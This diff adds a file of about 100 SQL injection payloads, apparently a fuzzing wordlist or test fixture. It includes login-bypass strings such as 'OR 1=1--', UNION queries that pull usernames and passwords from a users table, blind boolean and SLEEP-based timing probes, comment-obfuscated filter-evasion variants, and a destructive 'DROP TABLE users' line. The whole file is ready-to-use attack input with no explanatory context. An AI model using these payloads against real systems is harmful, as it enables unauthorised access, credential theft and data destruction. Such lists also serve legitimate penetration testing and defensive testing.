@@ -1,0 +1,100 @@
+admin' OR 1=1 --
+admin' OR 1=1 #
+admin' OR 1=1/*
+admin" OR 1=1 --
+admin" OR 1=1 #
+admin" OR 1=1/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+OR 1=1--
+OR 1=1#
+OR 1=1/*
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1, @@version--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1, user(), database(), version()--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL, NULL--
+' UNION ALL SELECT 1, 2, 3, 4--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT user()) AS INT)--
+' AND 1=CONVERT(int, (SELECT DATABASE()))--
+1' HAVING 1=1--
+1' GROUP BY columnnames HAVING 1=1--
+1' ORDER BY 1--
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1--
+1 AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+1 AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1))=68--
+1 AND LENGTH(DATABASE())>5--
+1 AND LENGTH(DATABASE())=5--
+1 AND IF((SELECT user())='root', SLEEP(5), 0)--
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+1 OR SLEEP(5)--
+1 AND SLEEP(5)--
+1' WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND BENCHMARK(1000000, MD5(1))--
+1' OR IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT user(), database(), version()--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+1 AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT TOP 1 name FROM sys.tables)--
+1' AND EXISTS(SELECT * FROM users WHERE username='admin')--
+' UNION SELECT username, password FROM users WHERE '1'='1--
+' UNION SELECT database(), user(), version()--
+1 UNION SELECT @@version--
+1 UNION SELECT user(), database()--
+1 UNION SELECT table_name FROM information_schema.tables--
+1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 77--
+' AND LENGTH((SELECT DATABASE()))=6--
+' AND (SELECT LENGTH(TABLE_NAME) FROM information_schema.tables LIMIT 1)=10--
+' AND ASCII(SUBSTRING((SELECT TABLE_NAME FROM information_schema.tables LIMIT 1), 1, 1))=84--
+1 OR 1=1--
+1 AND 1=1--
+1 UNION SELECT NULL--
+1 UNION SELECT 1,2,3--
+1 UNION SELECT user(), database(), @@version--
+admin" --
+admin'--
+admin/*
+1; DROP TABLE users--
+' OR '1'='1'--
+' UNION SELECT NULL,NULL--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' OR NOT EXISTS(SELECT * FROM users WHERE username='admin')--
+'/**/OR/**/1/**/=/**/1/**/--
+' UNION/**/SELECT/**/NULL,NULL--
+' UNION SELECT /*!50000 NULL,NULL*/--
+' OR /*!50000 1=1*/--
+' UNION /*!12345SELECT*/ user(),database()--
+' UNION/**/ALL/**/SELECT/**/NULL--
+' AND 1=CONVERT(INT, @@version)--
+' AND CAST((SELECT DATABASE()) AS CHAR)--
+' AND EXISTS(SELECT * FROM information_schema.tables)--
+' AND 1=(SELECT COUNT(*) FROM users)--
+' UNION SELECT 1, @@datadir--
+' UNION SELECT 1, @@tmpdir--
+1 UNION SELECT version()--
+1 UNION SELECT user()--
+1 UNION SELECT @@hostname--
+1 UNION SELECT @@datadir--
+1 UNION SELECT @@socket--
+1 UNION SELECT @@basedir--
+1' UNION SELECT * FROM OPENROWSET('SQL', 'Server=localhost', 'SELECT * FROM users')--
+{"query": "SELECT * FROM users WHERE id = 1 OR 1=1--"}
+<id>1 OR 1=1</id>
